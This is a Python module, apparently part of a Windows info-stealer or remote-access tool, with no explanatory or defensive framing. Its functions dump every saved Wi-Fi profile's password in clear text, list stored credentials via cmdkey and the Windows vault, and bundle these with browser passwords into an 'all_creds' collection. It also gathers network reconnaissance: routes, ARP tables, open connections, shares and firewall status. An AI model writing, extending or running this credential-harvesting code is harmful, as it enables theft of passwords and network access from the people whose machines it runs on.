from core.util import run, run_ps


def wifi():
    out = run('netsh wlan show profiles')
    names = [l.split(':', 1)[1].strip() for l in out.splitlines() if 'All User Profile' in l]
    res = []
    for n in names:
        r = run(f'netsh wlan show profile name="{n}" key=clear')
        k = [l.split(':', 1)[1].strip() for l in r.splitlines() if 'Key Content' in l]
        a = [l.split(':', 1)[1].strip() for l in r.splitlines() if 'Authentication' in l]
        res.append({'ssid': n, 'key': k[0] if k else '', 'auth': a[0] if a else ''})
    return res


def cmdkey():
    return [{'target': l.strip()} for l in run('cmdkey /list').splitlines() if 'Target:' in l]


def vault():
    raw = run_ps('vaultcmd /listcreds:"Windows Credentials" /all')
    return [l.strip() for l in raw.splitlines() if l.strip()]


def all_creds():
    from core import browser
    return {'wifi': wifi(), 'cmdkey': cmdkey(), 'vault': vault(), 'browser': browser.passwords()}


def net_summary():
    return {
        'wifi': wifi(),
        'proxy': run('netsh winhttp show proxy'),
        'adapters': run('netsh interface show interface'),
        'dns': run('ipconfig /all'),
        'route': run('route print -4'),
        'arp': run('arp -a'),
        'netstat': run('netstat -ano'),
        'shares': run('net share'),
        'fw': run_ps('Get-NetFirewallProfile | Select Name,Enabled | ft -AutoSize | Out-String'),
    }